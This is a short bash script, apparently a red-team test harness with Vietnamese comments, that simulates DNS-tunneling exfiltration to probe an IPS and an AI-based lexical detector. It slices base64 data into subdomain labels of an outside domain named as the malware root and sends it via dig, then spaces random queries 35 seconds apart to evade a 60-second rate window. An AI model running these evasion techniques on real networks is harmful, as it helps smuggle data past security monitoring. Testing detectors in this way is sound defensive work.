#!/bin/bash
# --- EVASION SIMULATOR FOR DNS TUNNELING ---

GATEWAY_IP="192.168.50.1"
MALWARE_ROOT="api-telemetry.com"

echo "[*] Initializing Evasion Attacks..."

# --- Kỹ thuật 1: Micro-slicing (Cắt nhỏ Payload) ---
# Mục tiêu: Làm giảm Entropy của từng gói tin để lừa AI Lexical
echo "[1] Starting Micro-slicing Attack..."
RAW_DATA="SGVsbG8gdGhpcyBpcyBhIHNlY3JldCBkYXRhIGV4ZmlsdHJhdGlvbiB0ZXN0" # Base64 data
# Cắt mỗi ký tự cách nhau bởi dấu chấm: S.G.V.s.b.G.8...
SLICED_DATA=$(echo $RAW_DATA | sed 's/./&./g')
EVASIVE_DOMAIN="${SLICED_DATA}${MALWARE_ROOT}"

echo " -> Sending Sliced Domain: $EVASIVE_DOMAIN"
dig +short TXT "$EVASIVE_DOMAIN" @$GATEWAY_IP > /dev/null
sleep 2


# --- Kỹ thuật 2: Low & Slow (Tấn công chậm chạp) ---
# Mục tiêu: Vượt qua bộ đếm Sliding Window (60s) của IPS
echo -e "\n[2] Starting Low & Slow Attack..."
for i in {1..3}; do
    PAYLOAD=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 32 | head -n 1)
    echo " -> Sending Packet $i (Waiting 35s to bypass window...)"
    dig +short TXT "${PAYLOAD}.${MALWARE_ROOT}" @$GATEWAY_IP > /dev/null
    
    if [ $i -lt 3 ]; then
        sleep 35 # Nghỉ 35 giây, gói tiếp theo sẽ làm gói trước đó bị văng khỏi window 60s (nếu ngưỡng là 3 hit/60s)
    fi
done

echo -e "\n[*] Evasion Simulation Completed."